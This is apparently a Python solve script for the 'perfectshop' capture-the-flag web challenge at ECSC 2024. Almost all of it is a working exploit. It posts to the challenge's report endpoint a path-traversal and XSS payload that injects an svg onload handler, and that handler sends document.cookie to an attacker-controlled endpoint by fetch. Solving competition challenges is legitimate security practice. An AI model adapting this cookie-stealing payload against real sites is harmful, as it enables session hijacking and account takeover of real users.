import requests

CHALL_URL = "http://perfectshop.challs.open.ecsc2024.it"
# CHALL_URL = "http://localhost:3000"
ENDPOINT = "ENDPOINT"


def report():
    # Note that this payload is URL encoded again by Requests package
    payload = {
        "id": f"0/../../search?q=/admin%3csvg%20onload=eval(`%27`%2BURL)%3e#';fetch('{ENDPOINT}?'+document.cookie);"
    }
    print(f"[PAYLOAD] -> {payload}")
    r = requests.post(CHALL_URL + "/report?/admin", payload)
    print(f"[DONE!] Go to your endpoint and submit the flag!")


# Boom!
report()
